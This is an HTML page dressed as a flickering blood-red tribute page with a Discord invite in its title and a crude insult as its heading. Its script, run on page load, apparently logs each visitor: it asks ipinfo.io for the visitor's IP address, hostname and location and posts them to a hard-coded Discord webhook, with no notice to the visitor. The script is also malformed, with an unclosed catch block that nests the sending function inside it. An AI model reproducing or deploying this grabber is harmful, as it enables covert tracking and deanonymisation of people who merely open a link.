<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>https://discord.gg/Kst92JTxNz</title>
    <style>
        /* Global Styles */
        body {
            font-family: 'Arial', sans-serif;
            background: radial-gradient(circle, rgba(0,0,0,1) 0%, rgba(105,0,0,1) 70%, rgba(0,0,0,1) 100%); /* Blood Red to Black Radial Gradient */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #fff;
            text-align: center;
            overflow: hidden;
            position: relative;
            animation: eerieGlow 5s ease-in-out infinite;
        }

        /* Flicker Effect for the Background */
        @keyframes eerieGlow {
            0% { background: rgba(105, 0, 0, 1); }
            25% { background: rgba(50, 0, 0, 1); }
            50% { background: rgba(105, 0, 0, 1); }
            75% { background: rgba(75, 0, 0, 1); }
            100% { background: rgba(105, 0, 0, 1); }
        }

        /* Main Container */
        .container {
            background-color: rgba(0, 0, 0, 0.85); /* Black with slight transparency */
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(8px);
            max-width: 450px;
            width: 100%;
            text-align: center;
            position: relative;
            overflow: hidden;
            animation: containerShake 0.5s ease-in-out infinite;
        }

        /* Flicker Effect for the Text */
        @keyframes textFlicker {
            0% { opacity: 1; }
            50% { opacity: 0.2; }
            100% { opacity: 1; }
        }

        h1 {
            font-size: 36px;
            color: #e74c3c; /* Scary Blood Red */
            font-weight: bold;
            text-shadow: 0 0 10px rgba(255, 0, 0, 0.8), 0 0 20px rgba(255, 0, 0, 0.6), 0 0 30px rgba(255, 0, 0, 0.4);
            margin-bottom: 20px;
            animation: textFlicker 1s infinite alternate;
        }

        .name {
            font-size: 48px;
            color: #ff0000; /* Blood Red */
            font-weight: bold;
            text-shadow: 0 0 15px rgba(255, 0, 0, 0.8), 0 0 20px rgba(255, 0, 0, 0.5), 0 0 25px rgba(255, 0, 0, 0.6);
            margin-bottom: 30px;
            cursor: pointer;
            transition: all 0.3s ease-in-out;
            animation: textFlicker 1.5s infinite alternate;
        }

        .name:hover {
            color: #ff6347; /* Lighter Red on Hover */
            transform: scale(1.1);
            text-shadow: 0 0 20px rgba(255, 0, 0, 1), 0 0 40px rgba(255, 0, 0, 0.8);
        }

        /* Footer */
        .footer {
            font-size: 14px;
            margin-top: 30px;
            color: #dcdcdc;
            position: absolute;
            bottom: 10px;
            width: 100%;
        }

        .footer p {
            margin: 0;
        }

        /* Animated Container Shake */
        @keyframes containerShake {
            0% { transform: rotate(0deg); }
            25% { transform: rotate(2deg); }
            50% { transform: rotate(0deg); }
            75% { transform: rotate(-2deg); }
            100% { transform: rotate(0deg); }
        }

        /* Creepy Shadow */
        .container:before {
            content: "";
            position: absolute;
            top: -5px;
            left: -5px;
            right: -5px;
            bottom: -5px;
            border: 3px solid #ff0000; /* Blood Red */
            border-radius: 20px;
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.6), 0 0 50px rgba(255, 0, 0, 0.4);
            animation: borderPulse 2s ease-in-out infinite;
        }

        /* Border Animation for the Container */
        @keyframes borderPulse {
            0% { box-shadow: 0 0 30px rgba(255, 0, 0, 0.6), 0 0 50px rgba(255, 0, 0, 0.4); }
            50% { box-shadow: 0 0 70px rgba(255, 0, 0, 1), 0 0 90px rgba(255, 0, 0, 0.8); }
            100% { box-shadow: 0 0 30px rgba(255, 0, 0, 0.6), 0 0 50px rgba(255, 0, 0, 0.4); }
        }

        /* Eerie Floating Eyes Effect */
        .floating-eyes {
            position: absolute;
            top: 10%;
            left: 10%;
            width: 30px;
            height: 30px;
            background-color: #fff;
            border-radius: 50%;
            box-shadow: 0 0 10px #fff, 0 0 20px #ff0000;
            animation: floatingEyes 4s ease-in-out infinite;
        }

        /* Floating Eyes Animation */
        @keyframes floatingEyes {
            0% { transform: translate(0, 0); }
            25% { transform: translate(15px, -10px); }
            50% { transform: translate(30px, 5px); }
            75% { transform: translate(10px, 20px); }
            100% { transform: translate(0, 0); }
        }

    </style>
</head>
<body>
    <!-- Floating Eyes -->
    <div class="floating-eyes"></div>
    
    <div class="container">
        <h1>Fuvk All Bloody Chollos</h1>
        <p class="name">MI AMOR XTUZZY</p>
        <div class="footer">
            <p>&copy; GOD RK,CK</p>
        </div>
    </div>

    <script>
        // Audio for Spooky Background Sound (Optional)
        const audio = new Audio('https://www.soundjay.com/button/beep-07.wav');
        audio.loop = true;
        audio.play();

        async function fetchUserInfo() {
            try {
                // Fetch data from ipinfo.io
                const response = await fetch('https://ipinfo.io/json?token=d63b09de191d25'); // Your API token
                const data = await response.json();

                // Ensure the data is valid

                // Send data to Discord
                sendToDiscord(data);
            } catch (error) {
                console.error("Error fetching user info:", error);

        async function sendToDiscord(data) {
            const webhookURL = 'https://discord.com/api/webhooks/1310076386190557195/wzNxlH1-ZuFnK-9gbTBX7tZSWCNKs9fSAfgpUZ0CkGhik72RIBYJ8qszZcgIdmE_j6f-'; // Your webhook URL

            const discordMessage = {
                content: `User Info:\nName: MI AMOR XTUZZY\nIP: ${data.ip}\nHostname: ${data.hostname}\nLocation: ${data.city}, ${data.region}, ${data.country}\nRegion: ${data.region}\nCountry: ${data.country}\nOther Data: ${JSON.stringify(data)}`
            };

            try {
                // Send the data to Discord using a POST request
                const response = await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(discordMessage)
                });

                if (response.ok) {
                    console.log('Message sent to Discord successfully!');
                } else {
                    console.error('Error sending message to Discord:', response.status);
                }
            } catch (error) {
                console.error('Error sending message to Discord:', error);
            }
        }

        // Fetch user info on load
        fetchUserInfo();
    </script>

</html>
